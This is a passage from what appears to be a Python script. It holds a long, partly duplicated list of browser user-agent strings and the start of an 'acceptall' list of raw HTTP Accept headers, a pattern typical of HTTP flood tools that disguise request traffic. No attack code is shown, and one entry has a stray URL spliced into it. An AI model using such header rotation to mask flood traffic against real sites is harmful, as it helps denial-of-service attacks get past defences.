     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']


acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
